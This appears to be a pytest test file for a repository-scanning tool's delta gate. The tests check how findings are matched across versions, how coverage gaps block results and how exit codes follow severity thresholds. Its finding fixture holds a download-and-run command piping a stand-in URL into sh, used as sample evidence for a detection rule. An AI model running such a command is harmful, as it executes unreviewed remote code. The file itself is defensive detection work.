"""Named edge cases for a deterministic delta gate with explicit incomplete results."""

from dataclasses import replace

import pytest

from repovet.comparison import ComparisonScope, DiffStatus, compare_findings, diff_exit_code
from repovet.models import Confidence, CoverageItem, CoverageStatus, Finding, Location, Severity


def finding(
    path: str = "src/check.sh",
    line: int = 4,
    *,
    severity: Severity = Severity.MEDIUM,
    context: str | None = None,
    content: str = "curl https://example.invalid/i | sh",
) -> Finding:
    return Finding(
        rule_id="RC-DLX-001",
        title="Download command",
        category="danger",
        area="download_exec",
        severity=severity,
        confidence=Confidence.HIGH,
        location=Location(path, line),
        message="Command downloads code",
        evidence=content,
        rationale="Review the command",
        recommendation="Read the source first",
        context=context,
    )


def gap(
    path: str, *, scope: str = "file", reason: str = "File content not checked"
) -> CoverageItem:
    return CoverageItem(scope, CoverageStatus.SKIPPED, reason, 1, (path,), (path,))


def test_line_shift_is_unchanged() -> None:
    result = compare_findings([finding(line=4)], [finding(line=44)])
    assert [change.status for change in result.changes] == [DiffStatus.UNCHANGED]
    assert diff_exit_code(result, Severity.MEDIUM) == 0


def test_rename_preserves_finding() -> None:
    scope = ComparisonScope({"old.sh": "100644:same"}, {"new.sh": "100644:same"})
    result = compare_findings([finding("old.sh")], [finding("new.sh")], scope)
    assert [change.status for change in result.changes] == [DiffStatus.UNCHANGED]
    assert diff_exit_code(result, Severity.MEDIUM) == 0


def test_unresolved_duplicate_assignment_is_incomplete() -> None:
    base = [finding("a/same.sh", 10), finding("b/same.sh", 10)]
    result = compare_findings(base, [finding("c/same.sh", 10)])
    assert result.incomplete
    assert {change.status for change in result.changes} == {DiffStatus.AMBIGUOUS}
    assert diff_exit_code(result, Severity.CRITICAL) == 3


def test_duplicate_assignment_and_output_order_are_deterministic() -> None:
    base = [finding("a/same.sh", 10), finding("b/same.sh", 10)]
    head = [finding("c/same.sh", 10), finding("z/other.sh", content="other content")]
    assert compare_findings(base, head) == compare_findings(
        list(reversed(base)), list(reversed(head))
    )


def test_same_occurrence_multiplicity_is_preserved() -> None:
    values = [finding("a.sh", 1), finding("b.sh", 1)]
    result = compare_findings(values, list(reversed(values)))
    assert len(result.changes) == 2
    assert not result.issues
    assert all(change.status is DiffStatus.UNCHANGED for change in result.changes)


@pytest.mark.parametrize("context", ["test", "docs", "example", "vendored"])
def test_label_promotion_is_worsened(context: str) -> None:
    result = compare_findings([finding(context=context)], [finding(context=None)])
    assert result.changes[0].status is DiffStatus.UPDATED
    assert result.changes[0].worsened
    assert diff_exit_code(result, Severity.MEDIUM) == 1
    assert diff_exit_code(result, Severity.HIGH) == 0


def test_label_demotion_is_updated_without_failing_gate() -> None:
    result = compare_findings([finding()], [finding(context="test")])
    assert result.changes[0].status is DiffStatus.UPDATED
    assert not result.changes[0].worsened
    assert diff_exit_code(result, Severity.MEDIUM) == 0


def test_severity_increase_obeys_fail_on() -> None:
    result = compare_findings([finding(severity=Severity.LOW)], [finding(severity=Severity.HIGH)])
    assert result.changes[0].worsened
    assert diff_exit_code(result, Severity.HIGH) == 1
    assert diff_exit_code(result, Severity.CRITICAL) == 0


def test_existing_critical_does_not_fail_diff() -> None:
    value = finding(severity=Severity.CRITICAL)
    assert diff_exit_code(compare_findings([value], [value]), Severity.LOW) == 0


def test_new_findings_obey_fail_on_and_chain_parts_do_not_count_twice() -> None:
    low = finding(severity=Severity.LOW)
    assert diff_exit_code(compare_findings([], [low]), Severity.MEDIUM) == 0
    assert diff_exit_code(compare_findings([], [low]), Severity.LOW) == 1
    part = replace(finding(severity=Severity.CRITICAL), in_chain="chain-1")
    assert diff_exit_code(compare_findings([], [part]), Severity.MEDIUM) == 0


def test_changed_file_that_becomes_unchecked_is_unknown() -> None:
    scope = ComparisonScope(
        {"src/check.sh": "old"}, {"src/check.sh": "new"}, after_coverage=[gap("src/check.sh")]
    )
    result = compare_findings([finding()], [], scope)
    assert result.changes[0].status is DiffStatus.UNKNOWN
    assert diff_exit_code(result, Severity.CRITICAL) == 3


def test_changed_unchecked_file_blocks_even_without_old_findings() -> None:
    scope = ComparisonScope({"x": "old"}, {"x": "new"}, after_coverage=[gap("x")])
    assert diff_exit_code(compare_findings([], [], scope), Severity.MEDIUM) == 3


def test_unchanged_and_equally_unchecked_file_does_not_block() -> None:
    scope = ComparisonScope({"x": "same"}, {"x": "same"}, [gap("x")], [gap("x")])
    result = compare_findings([], [], scope)
    assert not result.incomplete
    assert result.issues and not result.issues[0].blocking
    assert diff_exit_code(result, Severity.MEDIUM) == 0


def test_coverage_growth_conservatively_reports_new_findings() -> None:
    scope = ComparisonScope(
        {"src/check.sh": "large"}, {"src/check.sh": "small"}, before_coverage=[gap("src/check.sh")]
    )
    result = compare_findings([], [finding()], scope)
    assert result.changes[0].status is DiffStatus.NEW
    assert diff_exit_code(result, Severity.MEDIUM) == 1


def test_scope_loss_does_not_look_resolved() -> None:
    scope = ComparisonScope(
        {"src/check.sh": "same"},
        {"tests/check.sh": "same"},
        scope_lost=frozenset({("RC-DLX-001", "src/check.sh")}),
    )
    result = compare_findings([finding()], [], scope)
    assert result.changes[0].status is DiffStatus.UNKNOWN
    assert diff_exit_code(result, Severity.MEDIUM) == 3


def test_directory_gap_covers_changed_descendants() -> None:
    scope = ComparisonScope(
        {"node_modules": "40000:old"},
        {"node_modules": "40000:new"},
        after_coverage=[gap("node_modules")],
    )
    assert diff_exit_code(compare_findings([], [], scope), Severity.MEDIUM) == 3


def test_full_coverage_paths_beyond_display_sample_are_used() -> None:
    paths = tuple(f"file-{index}" for index in range(7))
    coverage = CoverageItem(
        "file", CoverageStatus.SKIPPED, "Not checked", len(paths), paths[:5], paths
    )
    scope = ComparisonScope(
        dict.fromkeys(paths, "same"),
        {p: "new" if p == paths[-1] else "same" for p in paths},
        [coverage],
        [coverage],
    )
    result = compare_findings([], [], scope)
    assert result.incomplete
    assert any(issue.blocking and paths[-1] in issue.paths for issue in result.issues)


def test_generic_foreign_dependency_contents_notice_is_not_a_local_file_gap() -> None:
    scope = ComparisonScope(
        {"package.json": "old"},
        {"package.json": "new"},
        after_coverage=[gap("package.json", scope="dependencies:contents")],
    )
    assert diff_exit_code(compare_findings([], [], scope), Severity.MEDIUM) == 0


def test_changed_submodule_is_incomplete() -> None:
    coverage = CoverageItem(
        "git:submodules", CoverageStatus.UNSUPPORTED, "Not fetched", 1, ("vendor",), ("vendor",)
    )
    scope = ComparisonScope(
        {"vendor": "160000:old"}, {"vendor": "160000:new"}, [coverage], [coverage]
    )
    assert diff_exit_code(compare_findings([], [], scope), Severity.MEDIUM) == 3


def test_global_scan_failure_blocks_changed_input_before_new_findings() -> None:
    coverage = CoverageItem("scan", CoverageStatus.PARTIAL, "Deadline reached", 1)
    scope = ComparisonScope({"x": "old"}, {"x": "new"}, after_coverage=[coverage])
    assert diff_exit_code(compare_findings([], [finding()], scope), Severity.MEDIUM) == 3


def test_deleted_file_without_coverage_loss_is_absent() -> None:
    scope = ComparisonScope({"src/check.sh": "old"}, {})
    result = compare_findings([finding()], [], scope)
    assert result.changes[0].status is DiffStatus.ABSENT
    assert diff_exit_code(result, Severity.INFO) == 0


def test_large_uncomputed_assignment_is_incomplete_instead_of_guessing() -> None:
    before = [finding(f"old/dir-{index}/same.sh", index + 1) for index in range(150)]
    after = [finding(f"new/dir-{index}/same.sh", index + 1) for index in range(150)]
    result = compare_findings(before, after)
    assert result.incomplete
    assert {change.status for change in result.changes} == {DiffStatus.UNKNOWN}
    assert diff_exit_code(result, Severity.CRITICAL) == 3


def test_many_identical_findings_at_existing_paths_remain_unchanged() -> None:
    before = [finding(f"dir-{index}/same.sh") for index in range(1000)]
    result = compare_findings(before, list(reversed(before)))
    assert len(result.changes) == 1000
    assert not result.incomplete
    assert all(change.status is DiffStatus.UNCHANGED for change in result.changes)


def test_many_unique_filenames_can_move_together() -> None:
    before = [finding(f"old/file-{index}.sh") for index in range(150)]
    after = [finding(f"new/file-{index}.sh") for index in range(150)]
    result = compare_findings(before, after)
    assert len(result.changes) == 150
    assert not result.incomplete
    assert all(change.status is DiffStatus.UNCHANGED for change in result.changes)


def test_unchanged_directory_gap_does_not_cover_a_similarly_named_path() -> None:
    before = {"node_modules": "same", "node_modules-other/x": "old"}
    after = {"node_modules": "same", "node_modules-other/x": "new"}
    coverage = [gap("node_modules")]
    scope = ComparisonScope(before, after, coverage, coverage)
    assert diff_exit_code(compare_findings([], [], scope), Severity.MEDIUM) == 0


def test_similarly_named_path_cannot_hide_a_changed_gap_descendant() -> None:
    before = {"node_modules/a": "old", "node_modules-other/x": "old"}
    after = dict.fromkeys(before, "new")
    coverage = [gap("node_modules")]
    scope = ComparisonScope(before, after, coverage, coverage)
    assert diff_exit_code(compare_findings([], [], scope), Severity.MEDIUM) == 3


def test_asymmetric_duplicate_matching_keeps_a_bounded_cost_budget(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import repovet.comparison as module

    calls = 0
    original = module._cost

    def cost(left: Finding, right: Finding) -> tuple[int, int, int, int, int]:
        nonlocal calls
        calls += 1
        assert calls < 10_000, "matching recomputed the same reverse candidates"
        return original(left, right)

    monkeypatch.setattr(module, "_cost", cost)
    before = [finding(f"old/{index}/same.sh", 1000 - index) for index in range(200)]
    result = compare_findings(before, [finding("new/same.sh", 1)])
    assert not result.incomplete
    assert calls < 1_000
